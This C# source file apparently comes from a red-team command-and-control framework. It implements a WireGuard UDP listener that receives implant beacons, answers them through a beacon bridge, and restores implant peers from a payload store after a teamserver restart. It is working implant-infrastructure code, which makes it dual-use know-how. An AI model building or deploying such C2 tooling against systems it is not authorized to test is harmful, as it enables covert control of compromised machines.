using System.Net;
using System.Net.Sockets;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Rod.Audit;
using Rod.CoreState.Engagements;
using Rod.CoreState.Listeners;

namespace Rod.Transport.Listeners.WireGuard;

// The wireguard listener's UDP server (architecture.md Sec 8, Sec 15.3
// ADR-004 as amended): one hosted service per wireguard listener entry,
// bound on the entry's address. The datagram exchange is the native
// router's (WireGuardTunnelRegistry); the contact composition inside the
// tunnel is the shared envelope core (WireGuardBeaconBridge). The server
// key is deployment-provisioned -- the listener's id names its slot in the
// WireGuard:ListenerKeys section -- the same operator-provisioned-material
// shape the Pki section takes.
//
// The router's peer set is process state: every build against this
// listener registered its artifact's public half at build time, and a
// restart opens a fresh router with none of them. The reopen re-registers
// from the payload store -- every stored payload whose baked dial is this
// listener's -- so a fielded artifact survives the teamserver it phones.

/// <summary>
/// Serves one wireguard listener entry's datagrams: inject each received
/// datagram into the listener's tunnel state, send back whatever the tunnel
/// answers, and answer a carried contact payload through the beacon bridge
/// over the session that carried it.
/// </summary>
internal sealed class WireGuardListenerService : BackgroundService
{
    private readonly Listener _listener;
    private readonly WireGuardTunnelRegistry _tunnels;
    private readonly WireGuardBeaconBridge _bridge;
    private readonly WireGuardOptions _options;
    private readonly IListenerRegistry _listeners;
    private readonly IPayloadStore _payloads;
    private readonly IEngagementRepository _engagements;
    private readonly ILogger<WireGuardListenerService> _logger;

    public WireGuardListenerService(
        Listener listener,
        WireGuardTunnelRegistry tunnels,
        WireGuardBeaconBridge bridge,
        WireGuardOptions options,
        IListenerRegistry listeners,
        IPayloadStore payloads,
        IEngagementRepository engagements,
        ILogger<WireGuardListenerService> logger)
    {
        _listener = listener;
        _tunnels = tunnels;
        _bridge = bridge;
        _options = options;
        _listeners = listeners;
        _payloads = payloads;
        _engagements = engagements;
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        // The listener's server key is the deployment's provisioned material;
        // absent or malformed, the bind fails loudly rather than opening a
        // socket nothing can terminate on.
        if (_options.TryPrivateKey(_listener.Name) is not { } serverPrivate)
            throw new InvalidOperationException(
                $"Listener '{_listener.Name}' has no WireGuard server key: name its base64 X25519 private key under WireGuard:ListenerKeys:{_listener.Name}.");

        _tunnels.OpenListener(_listener.Id, serverPrivate);
        var (host, port) = TransportHost.ParseBindAddress(_listener.BindAddress);
        using var udp = new UdpClient(new IPEndPoint(host, port));

        // Bind first, then register: the registry reflects what is actually
        // listening, the same ordering every transport follows.
        await _listeners.RegisterAsync(_listener, stoppingToken);

        // The fresh router knows no peers: re-register every stored
        // artifact that dials this listener, so a restart strands no
        // fielded implant (its public half rode the payload record for
        // exactly this pass).
        await RestorePeersAsync(stoppingToken);

        _logger.LogInformation(
            "Rod wireguard listener {Name} answering WireGuard contacts on {Bind} for {Public}.",
            _listener.Name, _listener.BindAddress, _listener.PublicEndpoint);

        while (!stoppingToken.IsCancellationRequested)
        {
            UdpReceiveResult datagram;
            try
            {
                datagram = await udp.ReceiveAsync(stoppingToken);
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (SocketException)
            {
                continue; // a transient socket error: next datagram
            }

            // One contact on a task of its own so a slow answer never
            // head-of-line blocks the receive loop.
            _ = AnswerAsync(udp, datagram, stoppingToken);
        }

        _tunnels.CloseListener(_listener.Id);
    }

    // The reopen's peer restore: the payloads whose baked dial is this
    // listener's wg:// dial, across every engagement -- a wireguard
    // artifact's peer registration is only as durable as the payload
    // record that carries its public half.
    private async Task RestorePeersAsync(CancellationToken cancellationToken)
    {
        var dial = WireGuardDial.Of(_listener);
        var restored = 0;
        foreach (var engagement in await _engagements.ListAsync(cancellationToken))
        {
            foreach (var payload in await _payloads.ListAsync(engagement.Id.Value, cancellationToken))
            {
                if (payload.WireGuardPublicKey is not { Length: 32 } peer)
                    continue;
                if (!string.Equals(payload.Endpoint, dial, StringComparison.OrdinalIgnoreCase))
                    continue;
                try
                {
                    _tunnels.RegisterPeer(_listener.Id, peer);
                    restored++;
                }
                catch (InvalidOperationException)
                {
                    // The store's bytes are not a key the router takes; the
                    // artifact's contacts cannot ride either way (its baked
                    // half is the same material), so the entry skips.
                }
            }
        }
        if (restored > 0)
            _logger.LogInformation(
                "WireGuard listener {Name} restored {Count} artifact peer(s) from the payload store.",
                _listener.Name, restored);
    }

    private async Task AnswerAsync(UdpClient udp, UdpReceiveResult received, CancellationToken cancellationToken)
    {
        WireGuardInjected injected;
        try
        {
            injected = _tunnels.Inject(_listener.Id, received.Buffer);
        }
        catch (InvalidOperationException ex)
        {
            // The tunnel state refused the datagram (no router, a native
            // failure): log and drop -- the contact's retry rides the next
            // cycle if the condition clears.
            _logger.LogWarning("WireGuard listener {Name} dropped a datagram: {Message}", _listener.Name, ex.Message);
            return;
        }

        // The tunnel's own network answer (a handshake response, a cookie
        // reply) goes back before any contact composition runs: the peer's
        // session stands on it.
        if (injected.Network.Length > 0)
            await SendAsync(udp, received.RemoteEndPoint, injected.Network);

        if (injected.Tunnel.Length == 0 || injected.Peer is null)
            return;

        // The carried payload is one envelope contact; the answer seals to
        // the peer whose session carried it. A refused contact (null)
        // answers nothing on the wire.
        byte[]? answer;
        try
        {
            answer = await _bridge.AnswerAsync(injected.Tunnel, _listener, cancellationToken);
        }
        catch (OperationCanceledException)
        {
            return;
        }
        if (answer is null || answer.Length == 0)
            return;

        byte[] datagram;
        try
        {
            datagram = _tunnels.Send(_listener.Id, injected.Peer, answer);
        }
        catch (WireGuardNative.WireGuardNoSessionException)
        {
            // The session ended between the contact and the answer; the
            // implant re-handshakes and re-sends on its next cycle.
            return;
        }

        await SendAsync(udp, received.RemoteEndPoint, datagram);
    }

    private static async Task SendAsync(UdpClient udp, IPEndPoint to, byte[] datagram)
    {
        try
        {
            await udp.SendAsync(datagram, datagram.Length, to);
        }
        catch (Exception ex) when (ex is SocketException or OperationCanceledException)
        {
            // The client vanished or the listener is stopping; the datagram
            // is disposable -- the implant's next contact retries.
        }
    }
}
